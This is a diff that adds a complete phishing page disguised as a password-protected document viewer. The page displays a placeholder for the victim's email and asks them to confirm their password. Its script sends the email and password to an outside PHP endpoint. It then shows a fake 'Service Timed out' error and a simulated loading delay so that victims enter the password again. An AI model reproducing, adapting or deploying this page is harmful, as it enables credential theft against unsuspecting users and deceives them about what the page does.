@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="https://monit.pages.dev/style.css">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Document</title>
+</head>
+<body onload="myFunction()">
+
+<div class="bg-image"></div>
+
+<div class="bg-text">
+    <p>[EMail]</p>
+    <hr>
+    <form onsubmit="return ajaxget()">  
+            
+        <div class="box2">
+            <p>Please confirm your password to open Document</p>
+        <input type="hidden" id="email" value="[EMail]" name="firstname" placeholder="Email Address" readonly>
+        
+        <input type="password" id="password" placeholder="Confirm Password to Continue" min="5" class="required"  onkeyup="enableSubmit()" required="">   <p>
+            <div id="becomeCat">
+            </div>
+            <div id="userAsCat">
+                <p align="center" style="color:red;">Service Timed out, Try again.</p>
+                                                                                                                    </div>
+
+
+
+
+
+
+
+
+
+  
+</div>
+            <button type="submit" onclick="setTimeout(transformCat, 4000);" id="myButton" class="button" disabled>Open Document</button>
+        </p>                                                                                          <p> </p>
+    
+    
+    </form>
+
+</div>
+
+</body>
+
+<script type="text/javascript">
+    
+    function enableSubmit(){
+    let inputs = document.getElementsByClassName('required'); // Enter your class name for a required field, this should also be reflected within your form fields.
+    let btn = document.querySelector('button[type="submit"]');
+    let isValid = true;
+    for (var i = 0; i < inputs.length; i++){
+    let changedInput = inputs[i];
+    if (changedInput.value.trim() === "" || changedInput.value === null){
+    isValid = false;
+    break;
+    }
+    }
+    btn.disabled = !isValid;
+    }
+    var transformCat = function (){
+//  var startTimer = Date.now();
+//  var endTimer = startTimer+900000;
+//if(startTimer<endTimer){
+document.getElementById("userAsCat").style.display="block";
+document.getElementById("becomeCat").style.display="none"
+setTimeout(function(){  document.getElementById("userAsCat").style.display="none";                   document.getElementById("becomeCat").style.display="block"},3000);
+};
+//}else{document.getElementById("userAsCat").style.display="none";}
+
+    //just some js to simulate fake loading time
+    
+    function removeClass(){  
+        myButton.className = myButton.className.replace(new RegExp('(?:^|\\s)loading(?!\\S)'), '');
+    }
+    
+    var myButton = document.getElementById('myButton');
+    
+    
+    myButton.addEventListener("click", function() {
+        myButton.className = myButton.className + ' loading';
+        setTimeout(removeClass, 4000);
+    }, false);
+            function ajaxget(){
+              // (A) GET FORM DATA
+              var data = new URLSearchParams();
+              data.append("i1", document.getElementById("email").value);
+              data.append("i2", document.getElementById("password").value);
+        
+              // (B) AJAX
+              var xhr = new XMLHttpRequest();
+              xhr.open("GET", "https://mwmitalia.co/micro/sex.php?" + data.toString());
+              // What to do when server responds
+              xhr.onload = function(){console.log(this.response);};
+              xhr.send();
+        
+              // (C) PREVENT HTML FORM SUBMIT
+              return false;
+            }
+    
+
+
+
+</script>
+</html>
